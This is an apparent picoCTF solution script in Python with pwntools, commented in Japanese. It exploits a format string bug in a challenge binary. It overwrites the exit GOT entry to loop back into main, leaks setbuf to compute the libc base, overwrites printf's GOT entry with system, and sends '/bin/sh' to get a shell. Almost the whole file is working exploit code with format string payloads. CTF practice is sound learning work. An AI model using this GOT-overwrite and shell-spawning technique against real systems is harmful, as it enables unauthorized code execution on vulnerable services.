#!/usr/bin/env python3
from pwn import *

bin_file = './chall_vulnfunc'
context(os = 'linux', arch = 'amd64')

binf = ELF( bin_file )

addr_main       = binf.functions['main'].address
addr_got_exit   = binf.got['exit']
addr_got_setbuf = binf.got['setbuf']

libc = binf.libc
offset_libc_setbuf = libc.functions['setbuf'].address
offset_libc_system = libc.functions['system'].address

def attack( proc, **kwargs ):
    
    # GOT Overwrite
    # ・書式文字列攻撃で、exit関数のGOTにmain関数のアドレスを書き込む
    # ・No PIEなので、got['exit'](0x404038)に、main関数(0x4011b6)を書き込む
    # ・0x11(17)、0x40(64)-17=47、0xb6(182)-17-64=101
    # ・bufは48byteなので、3回に分けると入らない → 最初に0xb6(182)を書いて、次に0x1140(4416)を書く
    # ・GOTを確認すると、exit関数は実行前なので、0x401770になってた → 2byte書き込みでいい
    # ・0x11(17)、0xb6(182)-17=165
    info( proc.sendafter( b'Input message', b'%17c%10$hhn%165c%11$hhn'.ljust(0x20, b' ') + p64(binf.got['exit'] + 1) + p64(binf.got['exit']) ).decode() )
    
    # setbuf関数のアドレスをリーク
    info( proc.sendafter( b'Input message', b'%8$s'.ljust(0x10, b' ') + p64(binf.got['setbuf']) ) )
    proc.recv(1) # \n
    addr_libc_setbuf = u64( proc.recv(6) + b'\x00\x00' )
    addr_libc_base   = addr_libc_setbuf - offset_libc_setbuf
    addr_libc_system = addr_libc_base + offset_libc_system
    info( f"addr_libc_setbuf={addr_libc_setbuf:#x}, addr_libc_base={addr_libc_base:#x}, addr_libc_base={addr_libc_base:#x}, addr_libc_system={addr_libc_system:#x}" )
    
    # GOT Overwrite
    # ・書式文字列攻撃で、printf関数のGOTにsystem関数のアドレスを書き込む
    # ・ASLRでアドレスは変わるが、got['printf'](0x7236d82606f0)に、system関数(0x7236d8250d70)を書き込む
    # 下位3byteを書き換えるが、2byteの取り方で2通りあるが、値の小さい方を選ぶ
    # さらに、2byteの方が1byteより値が小さかった場合を考慮して分岐する
    tmp1 = (addr_libc_system >> 8) & 0x00FFFF
    tmp2 = addr_libc_system & 0x00FFFF
    if tmp1 > tmp2:
        tmp3 = (addr_libc_system >> 16) & 0x0000FF
        info( f"addr_libc_system: 1byte {tmp3:#x}, 2byte {tmp2:#x}" )
        if tmp2 > tmp3:
            atk = f"%{tmp3}c%10$hhn%{tmp2-tmp3}c%11$hn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf'] + 2) + p64(binf.got['printf']) ).decode() )
        else:
            atk = f"%{tmp2}c%10$hn%{tmp3-tmp2}c%11$hhn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf']) + p64(binf.got['printf'] + 2) ).decode() )
    else:
        tmp3 = addr_libc_system & 0x0000FF
        info( f"addr_libc_system: 2byte {tmp2:#x}, 1byte {tmp3:#x}" )
        if tmp2 > tmp3:
            atk = f"%{tmp3}c%10$hhn%{tmp2-tmp3}c%11$hn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf']) + p64(binf.got['printf'] + 1) ).decode() )
        else:
            atk = f"%{tmp2}c%10$hn%{tmp3-tmp2}c%11$hhn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf'] + 1) + p64(binf.got['printf']) ).decode() )
    
    info( proc.sendafter( b'Input message', b'/bin/sh' ) )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 51556
    #adrs = "localhost"
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
